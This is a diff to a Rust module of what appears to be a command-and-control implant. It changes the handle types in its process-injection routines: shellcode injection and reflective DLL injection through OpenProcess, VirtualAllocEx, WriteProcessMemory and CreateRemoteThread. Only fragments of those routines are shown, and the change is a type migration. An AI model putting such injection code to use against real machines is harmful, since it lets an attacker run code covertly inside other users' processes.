@@ -303,7 +303,7 @@ mod inject_native {
     use red_cell_common::demon::{DemonInjectError, DemonInjectWay};
     use tracing::{info, warn};
 
-    use windows_sys::Win32::Foundation::{BOOL, CloseHandle, FALSE, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::Foundation::{CloseHandle, FALSE, HANDLE, INVALID_HANDLE_VALUE};
     use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
     use windows_sys::Win32::System::Memory::{
         MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
@@ -348,7 +348,7 @@ mod inject_native {
                 | PROCESS_CREATE_THREAD
                 | PROCESS_QUERY_INFORMATION;
             let handle = OpenProcess(access, FALSE, pid);
-            if handle == 0 || handle == INVALID_HANDLE_VALUE as isize {
+            if handle.is_null() || handle == INVALID_HANDLE_VALUE {
                 warn!(pid, "InjectShellcode: OpenProcess failed");
                 return DemonInjectError::Failed;
             }
@@ -412,7 +412,7 @@ mod inject_native {
     }
 
     /// Allocate RW memory, write shellcode, flip to RX, and create a remote thread.
-    unsafe fn write_and_execute(process: isize, shellcode: &[u8]) -> DemonInjectError {
+    unsafe fn write_and_execute(process: HANDLE, shellcode: &[u8]) -> DemonInjectError {
         let base = VirtualAllocEx(
             process,
             core::ptr::null(),
@@ -455,7 +455,7 @@ mod inject_native {
             0,
             core::ptr::null_mut(),
         );
-        if thread == 0 || thread == INVALID_HANDLE_VALUE as isize {
+        if thread.is_null() || thread == INVALID_HANDLE_VALUE {
             warn!("InjectShellcode: CreateRemoteThread failed");
             return DemonInjectError::Failed;
         }
@@ -482,7 +482,7 @@ mod inject_native {
                 | PROCESS_CREATE_THREAD
                 | PROCESS_QUERY_INFORMATION;
             let handle = OpenProcess(access, FALSE, pid);
-            if handle == 0 || handle == INVALID_HANDLE_VALUE as isize {
+            if handle.is_null() || handle == INVALID_HANDLE_VALUE {
                 warn!(pid, "InjectDll: OpenProcess failed");
                 return DemonInjectError::Failed;
             }
@@ -541,7 +541,7 @@ mod inject_native {
     /// Write loader + DLL + params into a remote process and create a thread at
     /// the loader entry.
     unsafe fn reflective_inject(
-        process: isize,
+        process: HANDLE,
         loader: &[u8],
         dll: &[u8],
         params: &[u8],
@@ -624,7 +624,7 @@ mod inject_native {
             0,
             core::ptr::null_mut(),
         );
-        if thread == 0 || thread == INVALID_HANDLE_VALUE as isize {
+        if thread.is_null() || thread == INVALID_HANDLE_VALUE {
             warn!("ReflectiveInject: CreateRemoteThread failed");
             return DemonInjectError::Failed;
         }
